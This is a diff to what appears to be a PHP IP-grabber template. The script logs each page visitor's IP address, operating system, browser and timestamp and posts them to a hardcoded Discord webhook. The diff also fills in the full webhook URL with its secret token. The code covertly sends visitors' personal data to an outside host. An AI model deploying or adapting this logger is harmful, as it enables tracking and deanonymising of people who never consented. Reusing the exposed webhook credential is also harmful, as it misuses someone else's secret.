@@ -2,7 +2,7 @@
 $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
 function getOS() { 
     global $user_agent;
-    $os_platform    =   "ESSICS IS LOADING IPS...";
+    $os_platform    =   "Bot";
     $os_array       =   array(
                             '/windows nt 10/i'     =>  'Windows 10',
                             '/windows nt 6.3/i'     =>  'Windows 8.1',
@@ -75,7 +75,7 @@ $site_refer = $_SERVER['HTTP_REFERER'];
 else{
 		$site = $site_refer;
 	}
-date_default_timezone_set('TIMEZONE');//<------------     Time Zone here      https://www.php.net/manual/en/timezones.php
+date_default_timezone_set('Europe/London');
 $time = date('Y-m-d H:i:s');
 $make_json = json_encode(array ('content'=>"$ip | $user_os | $user_browser | $time\n"));
 $exec = curl_init("https://discordapp.com/api/webhooks/726546771031097475/IpZ9FeBHRiKs4nNWzaEYXOr8rdP_M_jrSoe7tFDT6iacn4uqMJujrZJADjBX1S2nFc1Q");         //<------------     WEBHOOK HERE                                                                               <-----------      WEBHOOK ON THIS LINE
